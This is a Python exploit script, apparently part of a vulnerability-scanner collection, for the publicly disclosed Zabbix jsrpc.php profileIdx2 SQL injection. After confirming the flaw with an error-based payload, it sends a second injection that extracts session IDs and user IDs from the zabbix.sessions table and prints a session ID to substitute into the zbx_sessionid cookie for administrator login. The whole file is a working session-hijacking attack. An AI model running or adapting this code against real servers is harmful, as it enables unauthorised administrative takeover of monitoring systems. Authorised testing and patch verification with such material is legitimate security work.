#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: zabbix jsrpc.php SQL注入
referer: http://seclists.org/fulldisclosure/2016/Aug/82
author: Lucifer
description: 文件jsrpc.php中,参数profileIdx2存在SQL注入。利用注入得到sessionid修改为管理员直接登录。
'''
import sys
import requests
import warnings
from termcolor import cprint

class zabbix_jsrpc_profileIdx2_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(1234),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20or%201=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在zabbix jsrpc.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

            vulnurl = self.url + "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1%20or%20(select%201%20from%20(select%20count(*),concat((select%20(select%20concat(sessionid,0x7e7e7e,userid,0x7e7e7e,status))%20from%20zabbix.sessions%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20or%201=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.text.find("Duplicate entry") is not -1:
                start = req.text.find("Duplicate entry")
                end = req.text.find("~~~")
                sessionid = str(req.text)[start:end].strip("Duplicate entry '")
                cprint("[+]替换COOKIE中zbx_sessionid为 "+sessionid+" 登录至管理界面...", "green")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = zabbix_jsrpc_profileIdx2_sqli_BaseVerify(sys.argv[1])
    testVuln.run()